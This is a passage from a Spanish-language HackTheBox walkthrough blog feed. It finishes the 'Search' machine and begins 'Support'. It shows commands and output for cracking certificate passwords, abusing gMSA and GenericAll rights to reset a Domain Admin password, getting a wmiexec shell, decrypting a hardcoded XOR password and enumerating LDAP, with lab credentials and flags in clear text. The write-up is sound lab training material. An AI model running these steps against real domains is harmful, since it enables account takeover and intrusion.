<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\u</span>ser.txt <span class="o">(</span>33 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/10.129.229.57-RedirectedFolders_sierra.frye_user.txt
➜  content <span class="nb">cat </span>10.129.229.57-RedirectedFolders_sierra.frye_user.txt
0b2ce2a465386c9c4996ba16251795ac
</code></pre></div></div>

<ul>
  <li>Y vemos algo interesante si seguimos enumerando al parecer encontramos certificados.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$sierra</span>.frye/Downloads/Backups
	dr--r--r--                0 Mon Aug 10 15:39:17 2020	<span class="nb">.</span>
	dr--r--r--                0 Mon Aug 10 15:39:17 2020	..
	fr--r--r--             2643 Fri Jul 31 10:04:11 2020	search-RESEARCH-CA.p12
	fr--r--r--             4326 Mon Aug 10 15:39:17 2020	staff.pfx
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a descargarlos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\D</span>ownloads<span class="se">\B</span>ackups<span class="se">\s</span>earch-RESEARCH-CA.p12 <span class="o">(</span>2643 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_search-RESEARCH-CA.p12
➜  certificates smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\D</span>ownloads<span class="se">\B</span>ackups<span class="se">\s</span>taff.pfx <span class="o">(</span>4326 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx
</code></pre></div></div>

<ul>
  <li>Si importamos los certificados vemos que están protegidos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/11.png" />
</p>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">pfx2john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates pfx2john search-RESEARCH-CA.p12 <span class="o">&gt;</span> <span class="nb">hash</span>
➜  certificates pfx2john staff.pfx <span class="o">&gt;&gt;</span> <span class="nb">hash</span>
</code></pre></div></div>

<ul>
  <li>Y esta es la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts <span class="o">(</span>pfx, <span class="o">(</span>.pfx, .p12<span class="o">)</span> <span class="o">[</span>PKCS#12 PBE <span class="o">(</span>SHA1/SHA2<span class="o">)</span> 512/512 AVX512BW 16x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 2000 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>mac-type <span class="o">[</span>1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
misspissy        <span class="o">(</span>search-RESEARCH-CA.p12<span class="o">)</span>
misspissy        <span class="o">(</span>staff.pfx<span class="o">)</span>
2g 0:00:05:18 DONE <span class="o">(</span>2024-04-07 18:15<span class="o">)</span> 0.006282g/s 17229p/s 34458c/s 34458C/s misssnamy..missnono
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Y listo podemos importarlos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/12.png" />
</p>

<ul>
  <li>El certificado se llama <strong>staff</strong> si probamos con esa ruta vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/13.png" />
</p>

<ul>
  <li>Ahora accedemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/14.png" />
</p>

<ul>
  <li>Y vemos que estamos un <strong>Windows Powershell Web Access</strong>.</li>
</ul>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Si vamos a <code class="language-plaintext highlighter-rouge">Bloodhound</code> sabemos que estamos como <code class="language-plaintext highlighter-rouge">Sierra.Frye</code> tenemos una manera potencial de escalar privilegios pertenecemos a varios grupos entre esos tenemos el privilegio <code class="language-plaintext highlighter-rouge">ReadGMSAPassword</code> sobre <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> y ese usuario tiene el privilegio <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el usuario <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> que ese usuario pertenece al grupo <code class="language-plaintext highlighter-rouge">Domain Admins</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/15.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/16.png" />
</p>

<ul>
  <li>
    <p>Si somos este usuario <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> podemos cambiarle la contraseña al usuario <code class="language-plaintext highlighter-rouge">TRISTAN.DAVIES</code>.</p>
  </li>
  <li>
    <p>Podemos apoyarnos de este recurso ya que necesitamos obtener la contraseña de <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> <a href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#retrieving-themanaged-password">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#retrieving-themanaged-password</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/17.png" />
</p>

<ul>
  <li>Para ver la contraseña tenemos que hacer lo siguiente <a href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#decoding-themanaged-password">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#decoding-themanaged-password</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/18.png" />
</p>

<ul>
  <li>
    <p>Vamos a definir la credencial.</p>
  </li>
  <li>
    <p>Si la contraseña ya esta podemos usar <code class="language-plaintext highlighter-rouge">Invoke-Command</code> para ver si estamos ejecutando comandos como el usuario que queremos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/19.png" />
</p>

<ul>
  <li>Como tenemos privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> le vamos a cambiar la contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/20.png" />
</p>

<ul>
  <li>Como le acabamos de cambiar la contraseña a un usuario del <code class="language-plaintext highlighter-rouge">Domain Admins</code> en caso de que nos de <code class="language-plaintext highlighter-rouge">Pwn3d!</code> podemos usar <code class="language-plaintext highlighter-rouge">wmiexec</code> para conectarnos y tendremos privilegios máximos en el dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> <span class="s1">'tristan.davies'</span> <span class="nt">-p</span> <span class="s1">'nosequeponer$!'</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\t</span>ristan.davies:nosequeponer<span class="nv">$!</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<ul>
  <li>Y ya podemos ver la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-wmiexec search.htb/tristan.davies@10.129.229.57
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
C:<span class="se">\&gt;</span><span class="nb">whoami
</span>search<span class="se">\t</span>ristan.davies

C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5cbe8d044ee14475a7b40e8abd97c5a1
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Support (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html" rel="alternate" type="text/html" title="HackTheBox - Support (easy)" /><published>2024-04-11T00:00:00-06:00</published><updated>2024-04-11T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/11/support</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png" />
</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y sus tecnologias con la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49711 10.129.245.29 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-29 12:41 CST
Nmap scan report <span class="k">for </span>10.129.245.29
Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-03-29T18:42:15
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar en nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>

➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.245.29 support.htb dc.support.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.245.29 support.htb dc.support.htb
</code></pre></div></div>

<ul>
  <li>Si listamos los recursos compartidos por el protocolo <strong>smb</strong> vemos que tenemos acceso a un directorio llamado <strong>support-tools</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span>+] support.htb<span class="se">\m</span>iguel:
SMB         10.129.245.29   445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.129.245.29   445    DC               Share           Permissions     Remark
SMB         10.129.245.29   445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.245.29   445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.245.29   445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.129.245.29   445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.245.29   445    DC               NETLOGON                        Logon server share
SMB         10.129.245.29   445    DC               support-tools   READ            support staff tools
SMB         10.129.245.29   445    DC               SYSVOL                          Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos al recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-smbclient support.htb/miguel@10.129.245.29 <span class="nt">-no-pass</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use support-tools</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Wed Jul 20 12:01:06 2022 <span class="nb">.</span>
drw-rw-rw-          0  Sat May 28 06:18:25 2022 ..
<span class="nt">-rw-rw-rw-</span>    2880728  Sat May 28 06:19:19 2022 7-ZipPortable_21.07.paf.exe
<span class="nt">-rw-rw-rw-</span>    5439245  Sat May 28 06:19:55 2022 npp.8.4.1.portable.x64.zip
<span class="nt">-rw-rw-rw-</span>    1273576  Sat May 28 06:20:06 2022 putty.exe
<span class="nt">-rw-rw-rw-</span>   48102161  Sat May 28 06:19:31 2022 SysinternalsSuite.zip
<span class="nt">-rw-rw-rw-</span>     277499  Wed Jul 20 12:01:07 2022 UserInfo.exe.zip
<span class="nt">-rw-rw-rw-</span>      79171  Sat May 28 06:20:17 2022 windirstat1_1_2_setup.exe
<span class="nt">-rw-rw-rw-</span>   44398000  Sat May 28 06:19:43 2022 WiresharkPortable64_3.6.5.paf.exe
</code></pre></div></div>

<ul>
  <li>Encontramos varios <code class="language-plaintext highlighter-rouge">.exe</code> pero sin duda el que llama mas la atención es el <strong>UserInfo.exe.zip</strong> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># get UserInfo.exe.zip</span>
</code></pre></div></div>

<ul>
  <li>Antes de descomprimirlo vamos a ver que es lo que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l UserInfo.exe.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 277499 bytes <span class="o">(</span>271 KiB<span class="o">)</span>

Listing archive: UserInfo.exe.zip

<span class="nt">--</span>
Path <span class="o">=</span> UserInfo.exe.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 277499

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-05-27 11:51:05 .....        12288         5424  UserInfo.exe
2022-03-01 12:18:50 .....        99840        41727  CommandLineParser.dll
2021-10-22 17:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
2021-10-22 17:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
2021-10-22 17:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
2021-10-22 17:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
2020-02-19 04:05:18 .....        20856        11403  System.Buffers.dll
2020-02-19 04:05:18 .....       141184        58623  System.Memory.dll
2018-05-15 07:29:44 .....       115856        32709  System.Numerics.Vectors.dll
2021-10-22 17:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
2020-02-19 04:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
2022-05-27 10:59:39 .....          563          327  UserInfo.exe.config
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-05-27 11:51:05             652675       274861  12 files
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno al parecer hay muchos archivos de configuración así que para ver mejor el contenido y ver que se hace por detrás vamos a pasar el comprimido a una maquina Windows para usar <code class="language-plaintext highlighter-rouge">dnspy</code> y <code class="language-plaintext highlighter-rouge">debugear</code> el archivo <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Debugeando</code> encontramos un código interesante.</p>
  </li>
  <li>
    <p>El código configura una conexión LDAP llama a un método <code class="language-plaintext highlighter-rouge">Protected.getPassword()</code> para recuperar una contraseña.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/1.png" />
</p>

<ul>
  <li>Si nos vamos a <code class="language-plaintext highlighter-rouge">Protected</code> vemos el código que al parecer lo que hace es desencriptar una contraseña que esta codificada en <code class="language-plaintext highlighter-rouge">base64</code> y encriptada mediante una operación <code class="language-plaintext highlighter-rouge">XOR</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/2.png" />
</p>

<ul>
  <li>En el campo <code class="language-plaintext highlighter-rouge">enc_password</code> almacena una cadena que es una contraseña encriptada que esta en formato base64 y el campo <code class="language-plaintext highlighter-rouge">key</code> almacena una clave en forma de arreglo la clave parece ser derivada de la cadena <strong>armando</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/3.png" />
</p>

<ul>
  <li>
    <p>El problema de esto es que sabemos como funciona todo para poder obtener la contraseña en texto plano podemos usar Python3 para obtenerla simplemente siguiendo el funcionamiento del código.</p>
  </li>
  <li>
    <p>Simplemente ejecutamos <code class="language-plaintext highlighter-rouge">Python3</code> e importamos el modulo <code class="language-plaintext highlighter-rouge">base64</code> para decodificar la contraseña encriptada, después la variable <code class="language-plaintext highlighter-rouge">enc_password</code> contiene la contraseña encriptada, la clave <code class="language-plaintext highlighter-rouge">key</code> contiene la clave para la operación <code class="language-plaintext highlighter-rouge">XOR</code> que en este caso la clave es la cadena <code class="language-plaintext highlighter-rouge">ASCII</code> <strong>armando</strong>, después la contraseña encriptada se decodifica, se realiza la operación mediante un ciclo for que itera sobre cada byte de la contraseña encriptada y lo desencripta utilizando la calve y el valor (223) mediante la operación <code class="language-plaintext highlighter-rouge">XOR</code> y al final el resultado se convierte a una cadena utilizando caracteres <code class="language-plaintext highlighter-rouge">UTF-8</code> y se muestra por pantalla.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3
Python 3.11.8 <span class="o">(</span>main, Feb  7 2024, 21:52:08<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import <span class="nb">base64</span>
<span class="o">&gt;&gt;&gt;</span> enc_password <span class="o">=</span> <span class="s2">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span>
<span class="o">&gt;&gt;&gt;</span> key <span class="o">=</span> bytes<span class="o">(</span><span class="s2">"armando"</span>, <span class="nv">encoding</span><span class="o">=</span><span class="s1">'ascii'</span><span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> decoded_password <span class="o">=</span> base64.b64decode<span class="o">(</span>enc_password<span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> decrypted_password <span class="o">=</span> bytes<span class="o">([</span>decoded_password[i] ^ key[i % len<span class="o">(</span>key<span class="o">)]</span> ^ 223 <span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>len<span class="o">(</span>decoded_password<span class="o">))])</span>
<span class="o">&gt;&gt;&gt;</span> password <span class="o">=</span> decrypted_password.decode<span class="o">(</span><span class="s1">'utf-8'</span><span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span><span class="s2">"Decrypted Password:"</span>, password<span class="o">)</span>
Decrypted Password: nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>

<h2 id="shell-as-support">Shell as Support</h2>

<ul>
  <li>Una vez tenemos la contraseña en texto plano podemos comprobar si son correctas ya que nos decía que con el usuario <code class="language-plaintext highlighter-rouge">ldap</code> podemos conectarnos al servicio utilizando la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec ldap 10.129.245.29 <span class="nt">-u</span> ldap <span class="nt">-p</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.129.245.29   389    DC               <span class="o">[</span>+] support.htb<span class="se">\l</span>dap:nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
</code></pre></div></div>

<ul>
  <li>
    <p>Al ver que son correctas podemos enumerar el servicio <code class="language-plaintext highlighter-rouge">ldap</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
  </li>
  <li>
    <p>Al parecer el output es demasiada información pero si <code class="language-plaintext highlighter-rouge">grepeamos</code> por <code class="language-plaintext highlighter-rouge">info:</code> encontramos una contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ldapsearch <span class="nt">-H</span> ldap://support.htb <span class="nt">-D</span> <span class="s1">'support\ldap'</span> <span class="nt">-w</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="nt">-b</span> <span class="s1">'CN=Users,DC=support,DC=htb'</span> | <span class="nb">grep </span>info:
info: Ironside47pleasure40Watchful
</code></pre></div></div>

<ul>
  <li>Al parecer es del usuario <code class="language-plaintext highlighter-rouge">Support</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>info: Ironside47pleasure40Watchful
memberOf: <span class="nv">CN</span><span class="o">=</span>Shared Support Accounts,CN<span class="o">=</span>Users,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
memberOf: <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: <span class="nv">CqM5MfoxMEWepIBTs5an8Q</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA</span><span class="o">==</span>
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
</code></pre></div></div>

<ul>
  <li>Probando con <code class="language-plaintext highlighter-rouge">rpcclient</code> podemos conectarnos y enumerar los usuarios del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span>
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ldap] rid:[0x450]
user:[support] rid:[0x451]
user:[smith.rosario] rid:[0x452]
user:[hernandez.stanley] rid:[0x453]
user:[wilson.shelby] rid:[0x454]
user:[anderson.damian] rid:[0x455]
user:[thomas.raphael] rid:[0x456]
user:[levine.leopoldo] rid:[0x457]
user:[raven.clifton] rid:[0x458]
user:[bardot.mary] rid:[0x459]
user:[cromwell.gerard] rid:[0x45a]
user:[monroe.david] rid:[0x45b]
user:[west.laura] rid:[0x45c]
user:[langley.lucy] rid:[0x45d]
user:[daughtler.mabel] rid:[0x45e]
user:[stoll.rachelle] rid:[0x45f]
user:[ford.victoria] rid:[0x460]
</code></pre></div></div>

<ul>
  <li>Como tenemos una contraseña vamos a guardar los usuarios en una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-U</span> <span class="s1">'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> 10.129.245.29 <span class="nt">-c</span> <span class="s1">'enumdomusers'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
